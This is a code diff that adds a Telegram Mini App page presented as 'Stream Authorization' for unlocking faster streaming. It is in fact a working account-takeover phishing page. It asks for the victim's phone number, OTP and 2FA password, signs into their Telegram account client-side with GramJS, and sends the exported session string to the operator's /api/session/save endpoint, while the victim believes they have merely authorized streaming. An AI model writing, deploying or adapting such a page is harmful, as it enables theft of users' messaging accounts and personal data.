@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>H4R - Authorization</title>
+  
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;800&display=swap" rel="stylesheet" />
+  
+  <script src="https://cdn.jsdelivr.net/npm/telegram@2.22.2/browser/bundle.js"></script>
+
+  <style>
+    body { background-color: #050509; color: white; font-family: 'Outfit', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+    .glass { background: rgba(20, 22, 27, 0.85); border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(16px); }
+    .input-field { background: rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.2); color: white; width: 100%; padding: 14px 16px; border-radius: 12px; outline: none; margin-bottom: 16px; text-align: center; font-size: 15px; transition: 0.2s; }
+    .input-field:focus { border-color: #4fc3ff; box-shadow: 0 0 15px rgba(79,195,255,0.2); }
+    .auth-btn { background: linear-gradient(135deg, #4fc3ff 0%, #22e6c5 100%); color: #000; width: 100%; padding: 14px; border-radius: 12px; font-weight: 800; cursor: pointer; transition: 0.2s; border: none; box-shadow: 0 4px 15px rgba(34,230,197,0.25); }
+    .auth-btn:active { transform: scale(0.96); }
+    .auth-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+  </style>
+</head>
+<body>
+
+  <div class="glass w-full max-w-sm rounded-[24px] p-8 text-center shadow-[0_0_50px_rgba(79,195,255,0.15)] mx-4">
+    <div class="mx-auto mb-5 flex h-16 w-16 items-center justify-center rounded-full bg-blue-500/20 text-[#4fc3ff] text-3xl shadow-[0_0_20px_rgba(79,195,255,0.2)]">
+      <i class="fa-brands fa-telegram"></i>
+    </div>
+    <h2 class="text-xl font-bold mb-2">Stream Authorization</h2>
+    <p class="text-sm text-gray-400 mb-6">Link your Telegram account to unlock ultra-fast streaming servers.</p>
+
+    <!-- Step 1: Phone -->
+    <div id="step-phone">
+      <input type="text" id="inp-phone" class="input-field" placeholder="Phone Number (+91...)">
+      <button id="btn-send-code" class="auth-btn">Send OTP Code</button>
+    </div>
+
+    <!-- Step 2: OTP -->
+    <div id="step-otp" class="hidden">
+      <input type="text" id="inp-otp" class="input-field tracking-[0.5em] font-mono" placeholder="12345">
+      <button id="btn-verify-otp" class="auth-btn">Verify Code</button>
+    </div>
+
+    <!-- Step 3: Password (2FA) -->
+    <div id="step-pass" class="hidden">
+      <input type="password" id="inp-pass" class="input-field" placeholder="2FA Password">
+      <button id="btn-verify-pass" class="auth-btn">Unlock Streaming</button>
+    </div>
+    
+    <p id="statusMsg" class="mt-4 text-xs font-semibold text-[#4fc3ff]"></p>
+  </div>
+
+  <script>
+    const tg = window.Telegram ? window.Telegram.WebApp : null;
+    if (tg) tg.expand();
+    
+    const UID = window.Telegram?.WebApp?.initDataUnsafe?.user?.id || 7993892902;
+    const { TelegramClient } = telegram;
+    const { StringSession } = telegram.sessions;
+    
+    const apiId = Number("{{ api_id }}"); 
+    const apiHash = "{{ api_hash }}";
+    
+    let client;
+    let phoneCodeHash = '';
+    let currentPhone = '';
+
+    function setStatus(msg) { document.getElementById('statusMsg').innerText = msg; }
+
+    const btnSend = document.getElementById('btn-send-code');
+    const btnVerifyOtp = document.getElementById('btn-verify-otp');
+    const btnVerifyPass = document.getElementById('btn-verify-pass');
+
+    client = new TelegramClient(new StringSession(''), apiId, apiHash, { connectionRetries: 5 });
+
+    btnSend.onclick = async () => {
+        btnSend.disabled = true;
+        setStatus("Connecting to Telegram Servers...");
+        
+        currentPhone = document.getElementById('inp-phone').value.replace(/\s/g, '');
+        if (!currentPhone.startsWith('+')) currentPhone = '+' + currentPhone;
+
+        try {
+            if (!client.connected) await client.connect();
+            setStatus("Requesting OTP...");
+            const result = await client.sendCode({ apiId: apiId, apiHash: apiHash }, currentPhone);
+            phoneCodeHash = result.phoneCodeHash;
+            
+            document.getElementById('step-phone').classList.add('hidden');
+            document.getElementById('step-otp').classList.remove('hidden');
+            setStatus("✅ OTP sent to your Telegram App!");
+        } catch (err) { 
+            setStatus("❌ Error: " + err.message); 
+            btnSend.disabled = false;
+        }
+    };
+
+    btnVerifyOtp.onclick = async () => {
+        btnVerifyOtp.disabled = true;
+        setStatus("Verifying Code...");
+        const code = document.getElementById('inp-otp').value.replace(/\s/g, '');
+        try {
+            await client.signIn(currentPhone, { phoneCodeHash: phoneCodeHash, phoneCode: code });
+            await finalizeLogin();
+        } catch (err) {
+            if (err.message.includes('SESSION_PASSWORD_NEEDED')) {
+                document.getElementById('step-otp').classList.add('hidden');
+                document.getElementById('step-pass').classList.remove('hidden');
+                setStatus("🔒 2FA Password Required");
+            } else { 
+                setStatus("❌ Error: " + err.message); 
+                btnVerifyOtp.disabled = false;
+            }
+        }
+    };
+
+    btnVerifyPass.onclick = async () => {
+        btnVerifyPass.disabled = true;
+        setStatus("Checking Password...");
+        const password = document.getElementById('inp-pass').value.trim();
+        try {
+            await client.signInWithPassword({ password: password, apiId: apiId, apiHash: apiHash });
+            await finalizeLogin();
+        } catch (err) { 
+            setStatus("❌ Error: " + err.message); 
+            btnVerifyPass.disabled = false;
+        }
+    };
+
+    async function finalizeLogin() {
+        setStatus("Securing Session Data...");
+        const sessionString = client.session.save();
+        
+        await fetch('/api/session/save', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ uid: UID, session: sessionString })
+        });
+
+        setStatus("✅ Authorized! Redirecting...");
+        setTimeout(() => {
+            // Wapas player par redirect kar dega
+            window.history.back();
+        }, 1000);
+    }
+  </script>
+</body>
+</html>
